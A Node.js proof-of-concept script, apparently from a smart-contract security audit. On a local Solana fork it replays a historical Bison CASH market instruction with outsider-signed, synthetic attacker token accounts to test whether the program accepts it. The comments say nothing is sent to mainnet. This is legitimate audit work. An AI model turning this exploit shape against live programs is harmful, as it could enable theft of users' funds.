#!/usr/bin/env node
// Current Bison CASH market: outsider-signed direct CPI shape on isolated Surfpool fork.
// Attacker inventory and token accounts are synthetic fork fixtures; no mainnet send.
const fs=require('fs');
const m='/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {Connection,PublicKey,Keypair,TransactionInstruction,TransactionMessage,VersionedTransaction,SystemProgram}=require(m+'@solana/web3.js');
const bs58mod=require(m+'bs58'),bs58=bs58mod.default||bs58mod;
const program='2DNbzPochEcyCcWMbL4d9S3u9QqQEj5bbe6cSZFvKsbh';
const signature='25sU6hJDyHBvzuPRC181PTSf5BPDCsfCTbyC66j7m3okRiyKpgBmq7zZefxyqkexMnx5oerEaV2DPHwQFnwgodi9';
const env=Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env','utf8').split('\n').filter(Boolean).map(x=>x.split(/=(.*)/s).slice(0,2)));
const mainnet=new Connection(env.HEAVY_RPC_URL||env.RPC_URL,'confirmed');
const fork='http://127.0.0.1:9397';
let id=0;async function rpc(method,params){const r=await fetch(fork,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:++id,method,params})});const j=await r.json();if(j.error)throw Error(method+': '+JSON.stringify(j.error));return j.result}
const pk=s=>new PublicKey(s);
async function main(){
 const tx=await mainnet.getParsedTransaction(signature,{commitment:'confirmed',maxSupportedTransactionVersion:1});
 const original=tx?.meta?.innerInstructions?.flatMap(x=>x.instructions).find(x=>x.programId.toBase58()===program);
 if(!original||original.accounts.length!==18)throw Error('historical Bison instruction unavailable');
 const attacker=Keypair.generate(),outcome=Keypair.generate().publicKey,cash=Keypair.generate().publicKey;
 const template=await mainnet.getMultipleAccountsInfo([original.accounts[5],original.accounts[8]],'confirmed');
 if(template.some(x=>!x))throw Error('token templates unavailable');
 await rpc('surfnet_setAccount',[attacker.publicKey.toBase58(),{data:'',executable:false,lamports:1_000_000_000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 for(const [address,row,value] of [[outcome,template[0],100_000_000_000n],[cash,template[1],0n]]){
  const data=Buffer.from(row.data);attacker.publicKey.toBuffer().copy(data,32);data.writeBigUInt64LE(value,64);
  await rpc('surfnet_setAccount',[address.toBase58(),{data:data.toString('hex'),executable:false,lamports:row.lamports,owner:row.owner.toBase58(),rentEpoch:0}]);
 }
 const rootFlags=Object.fromEntries(tx.transaction.message.accountKeys.map(x=>[x.pubkey.toBase58(),x]));
 const keys=original.accounts.map((address,i)=>({pubkey:i===0?attacker.publicKey:i===1?outcome:i===2?cash:address,
  isSigner:i===0,isWritable:!!rootFlags[address.toBase58()]?.writable}));
 const ix=new TransactionInstruction({programId:pk(program),keys,data:Buffer.from(bs58.decode(original.data))});
 for(const item of [pk(program),...keys.map(x=>x.pubkey)])await rpc('getAccountInfo',[item.toBase58(),{encoding:'base64',commitment:'processed'}]);
 const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
 const message=new TransactionMessage({payerKey:attacker.publicKey,recentBlockhash:bh,instructions:[ix]}).compileToV0Message();
 const signed=new VersionedTransaction(message);signed.sign([attacker]);const wire=Buffer.from(signed.serialize());
 const sim=await rpc('simulateTransaction',[wire.toString('base64'),{encoding:'base64',sigVerify:true,
  replaceRecentBlockhash:false,commitment:'processed',accounts:{encoding:'base64',addresses:[outcome.toBase58(),cash.toBase58(),original.accounts[8].toBase58()]}}]);
 const row={generatedAt:new Date().toISOString(),program,sourceSignature:signature,sourceSlot:tx.slot,
  attacker:attacker.publicKey.toBase58(),syntheticOutcomeMicro:'100000000000',syntheticTraderAccounts:true,
  sigVerify:true,mainnetSubmitted:false,forkSubmitted:false,bytes:wire.length,keys:message.staticAccountKeys.length,
  err:sim.value.err,units:sim.value.unitsConsumed,logs:sim.value.logs};
 fs.writeFileSync(__dirname+'/bison-cash-direct-signed-screen.json',JSON.stringify(row,null,2)+'\n');
 console.log(JSON.stringify({err:row.err,bytes:row.bytes,keys:row.keys,units:row.units,tail:row.logs?.slice(-12)}));
}
main().catch(e=>{console.error(e.stack||e);process.exitCode=1});
